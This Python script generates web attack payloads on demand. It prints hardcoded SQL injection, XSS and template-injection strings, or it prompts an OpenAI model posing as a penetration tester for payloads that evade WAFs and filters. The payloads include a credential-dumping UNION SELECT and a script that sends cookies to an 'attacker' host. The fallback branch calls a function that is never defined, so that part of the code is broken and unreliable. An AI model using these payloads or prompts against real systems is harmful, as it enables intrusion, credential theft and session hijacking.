import os
import sys
from typing import List

try:
    import openai
except Exception:
    openai = None


def generate_mock_sqli() -> List[str]:
    """Deterministic SQLi payloads for demo/mock mode."""
    return [
        "' UNION SELECT username, password FROM users -- ",
        "admin'/**/OR/**/1=1-- -",
        "' OR 1=1; WAITFOR DELAY '0:0:3'--",
    ]


def generate_mock_xss() -> List[str]:
    """Deterministic XSS payloads for demo/mock mode."""
    return [
        "<svg onload=alert(1)>",
        "<img src=x onerror=confirm`xss`>",
        "<script>fetch('//attacker/pwn?c='+document.cookie)</script>",
    ]


def generate_mock_ssti() -> List[str]:
    """Deterministic SSTI payloads for demo/mock mode (popular templating engines)."""
    return [
        "{{7*7}}",  # Jinja2
        "${{7*7}}",  # Velocity/EL
        "#{7*7}",   # Twig-like
    ]


def get_attack_type() -> str:
    attack_type = os.getenv("ATTACK_TYPE", "SQLI").strip().upper()
    if attack_type not in {"SQLI", "XSS", "SSTI"}:
        attack_type = "SQLI"
    return attack_type


def main() -> None:
    """Generate or mock SQL injection payloads using OpenAI if available."""
    api_key = os.getenv("OPENAI_API_KEY")
    force_mock = os.getenv("MOCK_EXPLOIT", "0").strip() in {"1", "true", "True", "yes"}
    attack_type = get_attack_type()

    if force_mock or not api_key or openai is None:
        if attack_type == "XSS":
            payloads = generate_mock_xss()
        elif attack_type == "SSTI":
            payloads = generate_mock_ssti()
        else:
            payloads = generate_mock_sqli()
        print(f"Mode: MOCK ({attack_type})")
        print("Generated payloads:")
        for idx, payload in enumerate(payloads, start=1):
            print(f"{idx}. {payload}")
        return

    try:
        openai.api_key = api_key
        if attack_type == "XSS":
            prompt = (
                "You're an expert penetration tester. Generate 3 advanced XSS payloads "
                "to bypass basic filters (event handlers, DOM-based vectors) but keep them concise. "
                "Return as a numbered list, one per line."
            )
        elif attack_type == "SSTI":
            prompt = (
                "You're an expert penetration tester. Generate 3 SSTI proof-of-concept payloads "
                "for common templating engines (Jinja2, Twig, Velocity). Keep concise. "
                "Return as a numbered list, one per line."
            )
        else:
            prompt = (
                "You're an expert penetration tester. Generate 3 advanced SQL injection payloads "
                "to bypass a basic WAF filtering ' OR 1=1 -- and basic input blacklisting. "
                "Return as a numbered list, one per line."
            )
        response = openai.Completion.create(
            engine="text-davinci-003",
            prompt=prompt,
            max_tokens=150,
            temperature=0.6,
        )
        text = response["choices"][0]["text"].strip()
        print(f"Mode: OPENAI ({attack_type})")
        print("Generated payloads:")
        print(text)
    except Exception as error:
        print(f"OpenAI error: {error}", file=sys.stderr)
        print("Falling back to mock mode...", file=sys.stderr)
        payloads = generate_mock_payloads()
        print("Mode: MOCK (fallback)")
        print("Generated payloads:")
        for idx, payload in enumerate(payloads, start=1):
            print(f"{idx}. {payload}")


if __name__ == "__main__":
    main()
